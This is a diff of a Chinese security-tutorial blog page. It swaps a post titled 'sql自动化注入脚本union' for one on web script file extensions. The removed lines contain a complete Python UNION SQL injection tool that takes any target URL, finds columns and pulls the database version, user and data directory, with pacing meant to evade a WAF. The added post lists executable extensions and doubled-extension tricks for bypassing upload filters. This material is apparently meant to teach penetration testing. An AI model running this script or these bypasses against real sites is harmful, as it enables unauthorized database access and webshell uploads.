@@ -13,7 +13,7 @@
 
 
 
-<title>sql自动化注入脚本union | Apzx7</title>
+<title>2.5.1常见的网站文件后缀名 | Apzx7</title>
 
 
 
@@ -131,7 +131,7 @@
     
     <article class="post-wrap">
         <header class="post-header">
-            <h1 class="post-title">sql自动化注入脚本union</h1>
+            <h1 class="post-title">2.5.1常见的网站文件后缀名</h1>
             
                 <div class="post-meta">
                     
@@ -140,138 +140,28 @@
 
                     
                         <span class="post-time">
-                        Date: <a href="#">五月 4, 2025&nbsp;&nbsp;21:58:58</a>
+                        Date: <a href="#">五月 10, 2025&nbsp;&nbsp;9:33:47</a>
                         </span>
                     
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/upload/">upload</a>
+                            
+                        </span>
                     
                 </div>
             
         </header>
 
         <div class="post-content">
-            <p>import requests<br>import time<br>from urllib.parse import urljoin, quote</p>
-<p>class UnionInjector:<br>    def <strong>init</strong>(self, url):<br>        self.url &#x3D; url<br>        self.headers &#x3D; {<br>            ‘User-Agent’: ‘Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36’<br>        }<br>        self.timeout &#x3D; 10<br>        self.delay &#x3D; 1  # 请求间隔，避免触发WAF</p>
-<pre><code>def test_columns(self, param_name, max_columns=10):
-    print(&quot;[*] 开始测试列数...&quot;)
-    for i in range(1, max_columns + 1):
-        # 构造NULL联合查询
-        nulls = &#39;,&#39;.join([&#39;NULL&#39;] * i)
-        payload = f&quot;&#39; UNION SELECT &#123;nulls&#125;-- -&quot;
-        encoded_payload = quote(payload)
-        
-        try:
-            response = self.send_request(param_name, encoded_payload)
-            
-            # 如果页面正常返回，可能找到正确的列数
-            if response and response.status_code == 200:
-                print(f&quot;[+] 可能的列数: &#123;i&#125;&quot;)
-                print(f&quot;[+] 使用的Payload: &#123;payload&#125;&quot;)
-                return i
-                
-            time.sleep(self.delay)  # 请求间隔
-            
-        except Exception as e:
-            print(f&quot;[-] 测试列数 &#123;i&#125; 时出错: &#123;str(e)&#125;&quot;)
-            continue
-    
-    return None
+            <p>可执行脚本的文件后缀名，可被网站目录解析。以下是常见的后缀名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">asp</span><br><span class="line"></span><br><span class="line">asa</span><br><span class="line"></span><br><span class="line">cdx</span><br><span class="line"></span><br><span class="line">cer</span><br><span class="line"></span><br><span class="line">aspx</span><br><span class="line"></span><br><span class="line">ashx</span><br><span class="line"></span><br><span class="line">jsp</span><br><span class="line"></span><br><span class="line">php</span><br><span class="line"></span><br><span class="line">php3</span><br><span class="line"></span><br><span class="line">php.a</span><br><span class="line"></span><br><span class="line">shtml</span><br><span class="line"></span><br><span class="line">phtml</span><br></pre></td></tr></table></figure>
 
-def test_string_column(self, param_name, num_columns):
-    print(&quot;\n[*] 开始测试字符串列...&quot;)
-    test_str = &#39;TRAE&#39;
-    
-    for i in range(1, num_columns + 1):
-        # 构造测试字符串的查询
-        columns = [&#39;NULL&#39;] * num_columns
-        columns[i-1] = f&quot;&#39;&#123;test_str&#125;&#39;&quot;
-        payload = f&quot;&#39; UNION SELECT &#123;&#39;,&#39;.join(columns)&#125;-- -&quot;
-        encoded_payload = quote(payload)
-        
-        try:
-            response = self.send_request(param_name, encoded_payload)
-            
-            if response and response.status_code == 200:
-                if test_str in response.text:
-                    print(f&quot;[+] 发现字符串列: &#123;i&#125;&quot;)
-                    print(f&quot;[+] 使用的Payload: &#123;payload&#125;&quot;)
-                    return i
-                    
-            time.sleep(self.delay)
-            
-        except Exception as e:
-            print(f&quot;[-] 测试字符串列 &#123;i&#125; 时出错: &#123;str(e)&#125;&quot;)
-            continue
-    
-    return None
-
-def extract_data(self, param_name, num_columns, string_column):
-    print(&quot;\n[*] 开始提取数据...&quot;)
-    
-    # 常用的数据库信息查询
-    queries = [
-        &quot;version()&quot;,           # 数据库版本
-        &quot;database()&quot;,          # 当前数据库
-        &quot;user()&quot;,              # 当前用户
-        &quot;@@datadir&quot;,          # 数据库路径
-        &quot;system_user()&quot;,       # 系统用户
-        &quot;session_user()&quot;      # 会话用户
-    ]
-    
-    for query in queries:
-        columns = [&#39;NULL&#39;] * num_columns
-        columns[string_column-1] = query
-        payload = f&quot;&#39; UNION SELECT &#123;&#39;,&#39;.join(columns)&#125;-- -&quot;
-        encoded_payload = quote(payload)
-        
-        try:
-            response = self.send_request(param_name, encoded_payload)
-            
-            if response and response.status_code == 200:
-                print(f&quot;[+] &#123;query&#125;: &#123;response.text&#125;&quot;)
-                
-            time.sleep(self.delay)
-            
-        except Exception as e:
-            print(f&quot;[-] 提取 &#123;query&#125; 时出错: &#123;str(e)&#125;&quot;)
-            continue
-
-def send_request(self, param_name, payload):
-    test_url = f&quot;&#123;self.url&#125;?&#123;param_name&#125;=&#123;payload&#125;&quot;
-    return requests.get(
-        test_url,
-        headers=self.headers,
-        timeout=self.timeout
-    )
-</code></pre>
-<p>def main():<br>    print(“UNION联合注入测试工具”)<br>    print(“&#x3D;” * 50)</p>
-<pre><code>while True:
-    url = input(&quot;\n请输入目标URL (输入q退出): &quot;)
-    if url.lower() == &#39;q&#39;:
-        break
-        
-    if not url.startswith((&#39;http://&#39;, &#39;https://&#39;)):
-        url = &#39;http://&#39; + url
-        
-    param_name = input(&quot;请输入参数名: &quot;)
-    
-    injector = UnionInjector(url)
-    
-    # 1. 测试列数
-    num_columns = injector.test_columns(param_name)
-    if not num_columns:
-        print(&quot;[-] 未能确定列数&quot;)
-        continue
-        
-    # 2. 测试字符串列
-    string_column = injector.test_string_column(param_name, num_columns)
-    if not string_column:
-        print(&quot;[-] 未能找到字符串列&quot;)
-        continue
-        
-    # 3. 提取数据
-    injector.extract_data(param_name, num_columns, string_column)
-</code></pre>
-<p>if <strong>name</strong> &#x3D;&#x3D; “<strong>main</strong>“:<br>    main()</p>
+<p>有些网站会对 asp 或者 php 进行过滤转成空可用这些后缀名。</p>
+<p><code>aspasp asaspp</code></p>
+<p><code>phpphp</code></p>
 
         </div>
 
@@ -286,7 +176,7 @@ def send_request(self, param_name, payload):
                 
                     <p class="copyright-item">
                         <span>Permalink:</span>
-                        <span><a href="http://apzx7.github.io/2025/05/04/sql%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B3%A8%E5%85%A5%E8%84%9A%E6%9C%ACunion/">http://apzx7.github.io/2025/05/04/sql%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B3%A8%E5%85%A5%E8%84%9A%E6%9C%ACunion/</a></span>
+                        <span><a href="http://apzx7.github.io/2025/05/10/2-5-1%E5%B8%B8%E8%A7%81%E7%9A%84%E7%BD%91%E7%AB%99%E6%96%87%E4%BB%B6%E5%90%8E%E7%BC%80%E5%90%8D/">http://apzx7.github.io/2025/05/10/2-5-1%E5%B8%B8%E8%A7%81%E7%9A%84%E7%BD%91%E7%AB%99%E6%96%87%E4%BB%B6%E5%90%8E%E7%BC%80%E5%90%8D/</a></span>
                     </p>
                 
                 
@@ -319,10 +209,10 @@ def send_request(self, param_name, payload):
         </section>
         <section class="post-nav">
             
-                <a class="prev" rel="prev" href="/2025/05/10/upload%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/">upload基本原理</a>
+                <a class="prev" rel="prev" href="/2025/05/10/2-5-2%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">2.5.2任意文件上传漏洞</a>
             
             
-            <a class="next" rel="next" href="/2025/04/20/SQL%E6%B3%A8%E5%85%A5/SQL%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/">SQL注入相关知识</a>
+            <a class="next" rel="next" href="/2025/05/10/2-4%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/">2.4文件上传的攻击方法</a>
             
         </section>
 
